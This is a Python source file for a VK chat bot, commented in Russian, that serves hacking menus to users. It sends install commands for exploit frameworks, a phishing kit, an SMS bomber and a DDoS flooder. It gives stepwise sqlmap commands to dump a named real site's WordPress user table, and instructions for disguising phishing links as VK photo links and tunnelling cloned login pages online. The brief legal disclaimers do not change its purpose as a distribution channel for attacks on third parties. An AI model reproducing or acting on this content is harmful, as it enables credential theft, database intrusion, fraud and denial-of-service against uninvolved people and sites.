from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
import vk_api, datetime, random, json


with open("configs/token.json", "r") as read_file:
    configs = json.load(read_file)

token, group_id = configs["token"], configs["group_id"]

vk_session = vk_api.VkApi(token=token)
session_api = vk_session.get_api()
longpoll = VkBotLongPoll(vk_session, group_id)
followers = session_api.messages.getConversations()

time = lambda: datetime.datetime.today().strftime("[%H:%M:%S]")


# функция для отправки сообщения
def send_message(peer_id, message=None, attachment=None, keyboard=None):
    session_api.messages.send(
        peer_id=peer_id,
        message=message,
        random_id=random.randint(-2147483648, +2147483648),
        attachment=attachment,
        keyboard=keyboard
    )


# создание клавиатуры
def create_keyboard(payload):
    if payload == 0:
        keyboard = {
            "one_time": False,
            "buttons": [
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{1}--Information Gathering"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{2}--Exploitation Tools"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{3}--Web Hacking"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{4}--Other tools"}, "color": "positive"}]]}
        pass
    if payload == 11:
        keyboard = {
            "one_time": False,
            "buttons": [
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{1}--Nmap"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{2}--RED_HAWK/ReconDog"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{3}--OWScan"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{4}--Additional Scan tools"}, "color": "positive"}]]}
        pass
    if payload == 21:
        keyboard = {
            "one_time": False,
            "buttons": [
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{1}--Metasploit"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{2}--PhoneSploit"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{3}--Routersploit"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{4}--Additional Exploit tools"}, "color": "positive"}]]}
        pass
    if payload == 31:
        keyboard = {
            "one_time": False,
            "buttons": [
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{1}--Sqlmap/Sqlmate"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{2}--WPScan"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{3}--Fishing"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{4}--Additional Webhack tools"}, "color": "positive"}]]}
        pass
    if payload == 41:
        keyboard = {
            "one_time": False,
            "buttons": [
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{1}--Sms spaming tools"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{2}--Dos/DDos attack tools"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{3}--Lazyscripts"}, "color": "positive"}],
                [{"action": {"type": "text", "payload": "{\"button\": \"1\"}",
                             "label": "{4}--Feedback"}, "color": "positive"}]]}
        pass
    keyboard = json.dumps(keyboard, ensure_ascii=False).encode('utf-8')
    keyboard = str(keyboard.decode('utf-8'))
    return keyboard


# функция для рассылки
def mailing(message='Тестовая рассылка'):
    for i in range(followers['count']):
        try:
            send_message(peer_id=followers['items'][i]['conversation']['peer']['id'], message=message)
        except:
            continue

def commands(event, msg):
    if msg == '/start' or msg == '1':
        send_message(peer_id=event.obj.peer_id,
                     message='Starting..',
                     keyboard=create_keyboard(0))
    elif msg == '{1}--information gathering':
        send_message(peer_id=event.obj.peer_id,
                     message='{1}--Information Gathering',
                     keyboard=create_keyboard(11))
    elif msg == '{2}--exploitation tools':
        send_message(peer_id=event.obj.peer_id,
                     message='{2}--Exploitation Tools',
                     keyboard=create_keyboard(21))
    elif msg == '{3}--web hacking':
        send_message(peer_id=event.obj.peer_id,
                     message='{3}--Web Hacking',
                     keyboard=create_keyboard(31))
    elif msg == '{4}--other tools':
        send_message(peer_id=event.obj.peer_id,
                     message='{4}--Other tools',
                     keyboard=create_keyboard(41))
    elif msg == '{1}--nmap':
        send_message(peer_id=event.obj.peer_id,
                     message='''nmap — Утилита для исследования сети и сканер портов
    Синтаксис
    nmap [ <Тип сканирования> ...] [ <Опции> ] { <цель сканирования> }
    Nmap (Network Mapper) - это утилита с открытым исходным кодом для исследования сети и проверки безопасности. Она была 
    разработана для быстрого сканирования больших сетей, хотя прекрасно справляется и с единичными целями. Nmap использует 
    "сырые" IP пакеты оригинальным способом, чтобы определить какие хосты доступны в сети, какие службы 
    (название приложения и версию) они предлагают, какие операционные системы (и версии ОС) они используют, какие типы 
    пакетных фильтров/брандмауэров используются и еще множество других характеристик. В то время, как Nmap обычно 
    используется для проверки безопасности, многие системные администраторы находят ее полезной для обычных задач, таких 
    как контролирование структуры сети, управление расписаниями запуска служб и учет времени работы хоста или службы.
    Выходные данные Nmap это список просканированных целей с дополнительной информацией по каждой из них в зависимости от 
    заданных опций. Ключевой информацией является таблица важных портов. Эта таблица содержит номер порта, протокол, имя 
    службы и состояние. Состояние может иметь значение open (открыт), filtered (фильтруется), closed (закрыт) 
    или unfiltered (не фильтруется). Открыт означает, что приложение на целевой машине готово для установки 
    соединения/принятия пакетов на этот порт. Фильтруется означает, что брандмауэр, сетевой фильтр, или какая-то другая 
    помеха в сети блокирует порт, и Nmap не может установить открыт этот порт или закрыт. Закрытые порты не связаны ни 
    с каким приложением, но могут быть открыты в любой момент. Порты расцениваются как не фильтрованные, когда они отвечают 
    на запросы Nmap, но Nmap не может определить открыты они или закрыты. Nmap выдает комбинации открыт|фильтруется и 
    закрыт|фильтруется, когда не может определить, какое из этих двух состояний описывает порт. Эта таблица также может 
    предоставлять детали о версии программного обеспечения, если это было запрошено. Когда осуществляется сканирование 
    по IP протоколу (-sO), Nmap предоставляет информацию о поддерживаемых прот колах, а не об открытых портах.
    В дополнение к таблице важных портов Nmap может предоставлять дальнейшую информацию о целях: преобразованные DNS имена, 
    предположение об используемой операционной системе, типы устройств и MAC адреса.
    Самую новую версию Nmap можно скачать с https://nmap.org. Самая новая версия страницы справки Nmap (man page) 
    расположена по адресу https://nmap.org/book/man.html.''')
        send_message(peer_id=event.obj.peer_id, message='pkg install nmap')
    elif msg == '{2}--red_hawk/recondog':
        send_message(peer_id=event.obj.peer_id,
                     message='''As you know RED_HAWK is a good Information Gathering Tool written in php Red Hawk is used for Website Information Gathering such as who is Lookup, Reverse IP Lookup, xss, sqli scanning etc''')
        send_message(peer_id=event.obj.peer_id,
                     message='''git clone https://github.com/Tuhinshubhra/RED_HAWK.git\ncd RED_HAWK\nchmod +x rhawk.php\nphp rhawk.php''')
        send_message(peer_id=event.obj.peer_id,
                     message='''git clone https://github.com/UltimateHackers/ReconDog.git\ncd  ReconDog\npython2 dog.py''')
    elif msg == '{3}--owscan':
        send_message(peer_id=event.obj.peer_id,
                     message='''https://github.com/Gameye98/OWScan\ncd OWScan\nphp owscan.php''')
        send_message(peer_id=event.obj.peer_id,
                     message='''Scan your website for vulnerabilities. Find website application vulnerabilities and fingerprint the target web application.''')
    elif msg == '{4}--additional Scan tools':
        send_message(peer_id=event.obj.peer_id,
                     message='''Coming soon...''')
    elif msg == '{1}--metasploit':
        send_message(peer_id=event.obj.peer_id,
                     message='''ПРЕДУПРЕЖДЕНИЕ!\nДанная статья предоставляется лишь для ознакомления. Она не является побуждением к действиям, которые проделывает автор.Создано лишь в образовательных и развлекательных целях. Помните несанкционированный взлом чужих устройств является противоправным действием и карается по закону.Автор проделывает все действия лишь на собственном оборудовании и в собственной локальной сети.Сегодня Metasploit является одной из популярнейших программ, имеющих самую большую базу эксплоитов, шеллкодов и кучу разнообразной документации, что не может не обрадовать. Metasploit позволяет имитировать сетевую атаку и выявлять уязвимости системы, проверить эффективность работы IDS/IPS, или разрабатывать новые эксплоиты, с созданием подробного отчета.В качестве краткого описания ознакомимся с основными понятиями, а также рассмотрим некоторые команды MSF.Exploit — Фрагмент кода, использующий уязвимость в ПО или ОС для выполнения атаки на систему.Module — Модуль, автоматизирующий процесс какой-либо атаки.Shellcode — Шеллкод. Используется как полезная нагрузка эксплойта, обеспечивающая доступ к командной оболочке ОС.Payload — Полезная, или смысловая нагрузка. Это код, который выполняется после успешного выполнения атаки. Видов нагрузки в msf немало.«Stager» — Нагрузка, разбитая на части. Устанавливая соединение, шелл подгружается полностью.«Reverse shell» — Бэкконнект шел.«Meterpreter» — Пожалуй, один из популярных, если не самый популярный шелл. Имеет кучу возможностей: миграцию в процессы; XOR-шифрование, для обхода IDS и антивирусов; два вида dll-инжекции и т.д. Также можно выбрать «metsvc» нагрузку, что  зальет и пропишет meterpreter как сервис.  use — Выбор эксплоитаsearch — Поиск. Команда поиска более расширена; если вы забыли точное название или путь расположения эксплоита, она способна отобразить всю имеющуюся информациюshow options — Просмотр параметров для настройки. После выбора эксплоита, вы можете посмотреть какие опции доступны для настройкиshow payload — Просмотр полезных нагрузок. Msf содержит множество полезных нагрузок; воспользовавшись этой командой можно также посмотреть рекомендуемые нагрузки для конкретного эскплоита или ОСinfo — Просмотр подробной информации о полезной нагрузке(info payload_name)set — Установка параметров. Команда set устанавливает нужные параметры, например, RHOST(remote) и LHOST(local), или полезную нагрузку(set PAYLOAD windows/shell/reverse_tcp)check — Проверка хоста на уязвимостьexploit — Запуск сплоита. Когда цель выбрана и все возможное настроено, остается только завершающий этап — команда exploit''')
        send_message(peer_id=event.obj.peer_id,
                     message='pkg install unstable-repo\npkg install metasploit\nmsfconsole')
    elif msg == '{2}--websploit':
        send_message(peer_id=event.obj.peer_id,
                     message='''Websploit- многофункциональная программа для нахождения уязвимостей в сайтах, заражении устройств в WiFi сети эксплоитами и проведении MITM атак.Офф. сайт: http://sourceforge.net/projects/websploit/''')
        send_message(peer_id=event.obj.peer_id,
                     message='''apt install python2\npip2 install scapy\ngit clone https://github.com/The404Hacking/websploit.git\ncd websploit\nchmod 777 * websploit.py\npython2 websploit.py''')
    elif msg == '{4}--other tools':
        send_message(peer_id=event.obj.peer_id,
                     message='https://sectools.org/',
                     keyboard=create_keyboard(41))
    elif msg == '{3}--routersploit':
        send_message(peer_id=event.obj.peer_id,
                     message='''
    RouterSploit — это атакующая программная платформа с открытым исходным кодом на Python, основной нишей ее использования 
    являются различные «встроенные устройства» (embedded devices) - роутеры. По внешнему виду является своеобразным аналогом
     Metasploit Framework, а так же в работе, RouterSploit тоже использует модули.
    Список модулей пополняется практически каждый день. Уже представлены модули для идентификации и эксплуатации конкретных 
    уязвимостей, для проверки учетных данных на устойчивость и различные сканеры, предназначенные для поиска проблем.
    Типов модулей на данный момент три:
    · exploits — модули, которые эксплуатируют уязвимости;
    · creds — модули для проверки аутентификационных данных на сервисах (FTP, SSH, Telnet, HTTP basic auth, HTTP form auth, SNMP);
    · scanners — модули для проверки цели на уязвимости.
    В фреймворке присутствуют эксплойты для оборудования таких производителей как 2Wire, 
    Asmax, ASUS, Belkin, Cisco, Comtrend, D-Link, Fortinet, Juniper, Linksys, NETGEAR, Technicolor.
    Модуль проверки аутентификационных данных для каждого сервиса может работать в одном из двух режимов: в режиме проверки 
    паролей по умолчанию и в режиме перебора.
    У сканирования сейчас два модуля. Один позволит найти в сети все устройства фирмы D-Link, а второй для autopwn.
    Чтобы проверить, можно ли с помощью какого-либо из имеющихся эксплойтов взломать роутер, пишем:
    use scanners/autopwn
    set target <ip роутера>
    exploit''')
        send_message(peer_id=event.obj.peer_id,
                     message='''pip install future\napt install git figlet\ngit clone https://github.com/41Team/RoutersploitTermux\ncd RoutersploitTermux\nbash run.sh\ncd ~\ncd routersploit\npython rsf.py ''')
    elif msg == '{2}--phonesploit':

        send_message(peer_id=event.obj.peer_id,
                     message='wget https://raw.githubusercontent.com/MasterDevX/Termux-ADB/master/InstallTools.sh && bash InstallTools.sh\ngit clone https://github.com/Zucccs/PhoneSploit\ncd PhoneSploit\npip2 install colorama\npython2 main_linux.py', )
    elif msg == '{4}--additional exploit tools':
        send_message(peer_id=event.obj.peer_id,
                     message='Write {2}--websploit',
                     keyboard=create_keyboard(31))
    elif msg == '{1}--sqlmap/sqlmate':

        send_message(peer_id=event.obj.peer_id,
                     message='''Программа sqlmap позволяет проверять сайты на наличие в них уязвимости SQL-инъекция, уязвимости XSS, а также эксплуатировать SQL-инъекцию. Поддерживаются разнообразные типы SQL-инъекций и разнообразные базы данных. 
                        Что же такое SQL инъекция? Говоря простым языком — это атака на базу данных, которая позволит выполнить некоторое действие, которое не планировалось создателем скрипта. Пример из жизни: Отец, написал в записке маме, чтобы она дала Васе 100 рублей и положил её на стол. Переработав это в шуточный SQL язык, мы получим: ДОСТАНЬ ИЗ кошелька 100 РУБЛЕЙ И ДАЙ ИХ Васе Так-как отец плохо написал записку (Корявый почерк), и оставил её на столе, её увидел брат Васи — Петя. Петя, будучи хакер, дописал там «ИЛИ Пете» и получился такой запрос: ДОСТАНЬ ИЗ кошелька 100 РУБЛЕЙ И ДАЙ ИХ Васе ИЛИ Пете Мама прочитав записку, решила, что Васе она давала деньги вчера и дала 100 рублей Пете. Вот простой пример SQL инъекции из жизни :) Не фильтруя данные (Мама еле разобрала почерк), Петя добился профита.''')
        send_message(peer_id=event.obj.peer_id,
                     message='''git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev\ngit clone https://github.com/UltimateHackers/sqlmate\ncd sqlmap-dev\nchmod +x sqlmap.py\npip2 install -r requirements.txt\ncd ~ && cd sqlmate\nchmod +x sqlmate\npython2 sqlmate''')
        send_message(peer_id=event.obj.peer_id,
                     message='''Вводим дорку (к примеру category.php?id=) и он ищет сайты с этой доркой, 
    ждем .. и смотрим что он нашел , выбераем сайт с [+] слева и суем его в sqlmap
    Пишем:
    python2 sqlmap.py -u [сайт (без скобок)] --random-agent --threads 10 --dbs
    -u // адрес сайта
    --dbs // это комманда чтоб показать бд сайта
    --threads кол. потоков // многопоточность
    --random-agent // это рандомный юзер агент, ибо дефолтный палевный.
    И ждем, попутно отвечая на вопросы, которые задает sql.
    Если все отлично, то в итоге вы получите список баз как результат.
    Теперь смотрим какие базы есть.Пишем в консоль:
    python2 sqlmap.py -u [сайт (без скобок)] --random-agent --threads 10 -D [название таблицы] --tables
    -D название базы // указываем название базы, с которой будем тянуть таблицы и колонки
    --tables // означает, что мы хотим вытянуть таблицы, какие там есть, их названия с базы
    python2 sqlmap.py -u www.thejobilove.com.au/category.php?id=15 --random-agent --threads 10 -D thejob_jil -T wp_users --columns
    -T [название таблицы]
    --columns // столбики какие есть в таблице
    python2 sqlmap.py -u [сайт (без скобок)] --random-agent --threads 10 -D [название таблицы] -T [название столбика] [название строки столбика], [название строки столбика] --dump
    -C название,название,название //выбираем колонки под дамп
    --dump // ну это понятно, команда на дамп''')
        send_message(peer_id=event.obj.peer_id,
                     message='''0''')
    elif msg == '{2}--wpscan':
        send_message(peer_id=event.obj.peer_id,
                     message=''' WPScan — это сканер уязвимостей WordPress, работающий по принципу «чёрного ящика», т. е. без доступа к исходному коду. Он может быть использован для сканирования удалённых сайтов WordPress в поисках проблем безопасности.
    Домашняя страница: http://wpscan.org/ ''')
        send_message(peer_id=event.obj.peer_id,
                     message='''git clone https://github.com/wpscanteam/wpscan\ncd wpscan/\nchmod 777 wpscan.rb\ngem install bundle\nbundle install -j5\nruby wpscan.rb''')
    elif msg == '{3}--fishing':
        send_message(peer_id=event.obj.peer_id,
                     message='''фишинг ВК и СИ

    git clone https://github.com/foxlitegor/fisher
    cd fisher
    chmod 777 install.sh
    sh install.sh
    Использование:
    fish
    run

    СИ
    Скидываем ссылку самому себе например и копируем адрес ссылки.(https://vk.com/away.php?to={домен})
    После "?" пишем "photo=2355_63454&"(не влияет на работу ссылки) или что-то подобное, что бы было похоже на ссылку ВК к фотографию.(https://vk.com/away.php?photo=2355 63&to={домен}) 
    Если никто не заходит в течении 5-15 мин, то тунель выключается, поэтому его надо обновлять (заходить на сайт или пинговать ping {домен})''')
        send_message(peer_id=event.obj.peer_id,
                     message='''"УК РФ Статья 159.6. Мошенничество в сфере компьютерной информации"\nДля начала, думаю, расскажу про фишинг "Фишинг (англ. phishing, от fishing — рыбная ловля, выуживание) — вид интернет-мошенничества, целью которого является получение доступа к конфиденциальным данным пользователей — логинам и паролям."''')
        send_message(peer_id=event.obj.peer_id,
                     message='''git clone https://github.com/evait-security/weeman\ncd weeman\npython2 weeman.py''')
        send_message(peer_id=event.obj.peer_id,
                     message='''set url https://yandex.ru (сайт который копируем)\nset port 8080 (порт)\nset action_url https://yandex.ru (сайт на кторорый кидает после действий на нашем сайте)\nshow (смотрим правильность введнных данных\nrun (запускаем)''')
        send_message(peer_id=event.obj.peer_id,
                     message='''
    Для того чтобы выложить наш сайт в глобал надо открыть следующую вкладку и написать
    pkg install openssh
    После установки пишем 
    ssh -R 80:localhost:8080 ssh.localhost.run -l {ваш домен}
    Пример:
    ssh -R 80:localhost:8080 ssh.localhost.run -l test.test
    Получится сайт:
    test.test.localhost.run
    Если напишите {домен}.ru или .com то ничего не выйдет!
    ''')
    elif msg == '{4}--additional webhack tools':
        send_message(peer_id=event.obj.peer_id,
                     message='''Write {2}--websploit''')
        send_message(peer_id=event.obj.peer_id,
                     message='''Write {2}--websploit''')
    elif msg == '{1}--sms spaming tools':
        send_message(peer_id=event.obj.peer_id,
                     message='''тут проблемс)))))''')
        send_message(peer_id=event.obj.peer_id,
                     message='''https://github.com/crinny/b0mb3r азработчик удалил репозиторий но он сохранился у меня поэтому могу перезалить если вам сильно надо''')
    elif msg == '{3}--lazyscripts':
        send_message(peer_id=event.obj.peer_id,
                     message='''[+] usage :-

    python2 ls.py
    (here simply type number to use that tool)
    Enjoy.
    ''')
        send_message(peer_id=event.obj.peer_id,
                     message='''git clone https://github.com/TechnicalMujeeb/Termux-Lazyscript.git
    cd Termux-Lazyscript
    chmod +x *
    sh setup.sh''')
    elif msg == '{2}--dos/ddos attack tools':
        send_message(peer_id=event.obj.peer_id,
                     message='''Вот гит''')
        send_message(peer_id=event.obj.peer_id,
                     message='''https://github.com/YamkaFox/SFlooder''')
    elif msg == '{4}--feedback':
        send_message(peer_id=512960754,
                     message='feedback by @id' + str(event.obj.peer_id))
    else:
        send_message(peer_id=event.obj.peer_id,
                     message='Starting...',
                     keyboard=create_keyboard(0))